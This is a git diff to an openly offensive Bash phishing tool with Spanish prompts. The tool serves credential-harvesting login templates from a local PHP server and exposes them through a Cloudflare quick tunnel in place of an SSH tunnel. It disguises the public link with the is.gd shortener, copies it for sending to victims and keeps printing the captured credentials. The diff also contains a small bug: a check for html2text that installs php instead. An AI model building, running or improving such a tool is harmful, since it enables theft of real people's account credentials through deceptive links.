@@ -7,6 +7,7 @@ MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(prin
 RESETBG="$(printf '\e[0m\n')" END="$(printf '\033[0m\e[0m')"
 
 ctrl_c(){
+	sudo pkill cloudflared &>/dev/null
 	sudo pkill php &>/dev/null
 	sudo pkill xterm &>/dev/null
 	if [[ -f "sites/$x/credentials.txt" && -s "sites/$x/credentials.txt" ]];then
@@ -17,7 +18,7 @@ ctrl_c(){
 		cat sites/$x/credentials.txt
 		rm sites/$x/credentials.txt &>/dev/null
 	fi
-	rm link.txt
+	rm tunnel.log
 	exit 1
 } 2>/dev/null
 
@@ -79,6 +80,12 @@ ${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀�
 }
 
 cheker(){
+
+	which html2text &>/dev/null
+	if [ $? -ne "0" ];then
+		echo -e "\n[+]${CYAN} Instalando php...${END}"
+		sudo apt install php -y &>/dev/null
+	fi
 	which php &>/dev/null
 	if [ $? -ne "0" ];then
 		echo -e "\n[+]${CYAN} Instalando php...${END}"
@@ -98,7 +105,19 @@ cheker(){
 	if [ $? -ne "0" ];then
 		echo -e "\n[+]${CYAN} Instalando xclip...${END}"
 		sudo apt install xclip -y &>/dev/null
-	fi 
+	fi
+	if ! command -v cloudflared &>/dev/null; then
+	    echo -e "\n[+]${CYAN} Instalando Cloudflare...${END}"
+	    URL_DEB=$(curl -s https://github.com/cloudflare/cloudflared/releases | grep -oP '/cloudflare/cloudflared/releases/download/[^"]+cloudflared-fips-linux-amd64.deb' | head -n 1)
+
+	    if [ -n "$URL_DEB" ]; then
+	        wget "https://github.com${URL_DEB}" -O cloudflared-fips.deb &>/dev/null
+	        sudo dpkg -i cloudflared-fips.deb &>/dev/null
+	        rm cloudflared-fips.deb
+	    else
+	        echo -e "${RED}[!] No se pudo encontrar el enlace de descarga.${END}"
+	    fi
+	fi
 	clear
 	banner
 }
@@ -112,24 +131,47 @@ process(){
 	# cd ../../
 	if [ $2 == 'Port_Forwarding' ];then
 	    php -S 127.0.0.1:80 &>/dev/null &
+	    path=$(pwd)
 	    cd ../../
-		xterm -geometry 93x20-50-350 -hold -title "Servidor" -e "sudo ssh -R 80:localhost:80 nokey@localhost.run > link.txt" &
-		sleep 2
+
+		cloudflared tunnel --url http://127.0.0.1:80 > tunnel.log 2>&1 &
+		CPID=$!
+
+		echo -ne "[${CYAN}+${END}] ${CYAN}Esperando a que Cloudflare genere el túnel${END}..."
+
+		for i in {1..15}; do
+		    MI_LINK=$(grep -o "https://.*trycloudflare.com" tunnel.log | sed 's/ //g' | tr -d '|')
+		    
+		    if [ -n "$MI_LINK" ]; then
+		        break
+		    fi
+		    
+		    echo -n "."
+		    sleep 1
+		done
+
+		if [ -z "$MI_LINK" ]; then
+		    echo -e "\n[!] Error: No se pudo capturar el enlace. Revisa tunnel.log"
+		fi
+
 		while true;do
-			link=$(cat link.txt | grep https | head -n1 | awk '{print $NF}')
 			if [ $3 == 'Enmascarar_link' ];then
-				mask $link $1
+				mask $MI_LINK $1
 				break
 			else
-				clear
-				banner
-				echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $link"
-				echo $link | xclip -sel clip
-				echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
+				while true;do
+					clear
+					banner
+					echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $MI_LINK"
+					echo $MI_LINK | xclip -sel clip
+					echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"
+					echo -e "\n[${CYAN}X${END}] ${CYAN}Credenciales capturadas:${END}"				
+					cat $path/credentials.txt 2>/dev/null
+					sleep 5
+				done
 			break
 			fi
 		done
-		xterm -geometry 93x20-750-350 -hold -title "Credenciales" -e "watch -n1 cat sites/$1/credentials.txt" &
 		while true;do
 			sleep 1
 		done
@@ -147,7 +189,7 @@ process(){
 }
 
 mask(){
-	echo -e "[${CYAN}+${END}] ${RED}(OPCIONAL) ${CYAN}Ingrese el complemento de la plantilla separado por '-' Ejemplo: photos-perros${END}"
+	echo -e "\n[${CYAN}+${END}] ${RED}(OPCIONAL) ${CYAN}Ingrese el complemento de la plantilla separado por '-' Ejemplo: photos-perros${END}"
 	read -r -p "[${CYAN}+${END}] ${CYAN}Complemento de la plantilla:${END} " complemento 
 	complemento2=$(echo $complemento | sed 's/-/%7A/g')
 	curl -s --data "url=$1&shorturl=&opt=0" https://is.gd/create.php | html2text > masbien.tmp
@@ -169,7 +211,7 @@ mask(){
 	    echo $complete | xclip -sel clip
 		echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
 	fi
-	rm masbien.tmp 
+	# rm masbien.tmp 
 }
 
 selection(){
@@ -212,11 +254,7 @@ selection(){
 if [ $(id -u) -ne "0" ];then
     echo -e "\n[!]${RED} Ejecute este script como root...${END}\n"
     exit 1
-else
-	cat /root/.ssh/id_rsa &>/dev/null
-	if [ $? -ne 0 ];then
-		ssh-keygen -t rsa -f /root/.ssh/id_rsa -q -P "" 
-	fi	
+else	
 	for p in {1..3};do
 		clear
 		demon
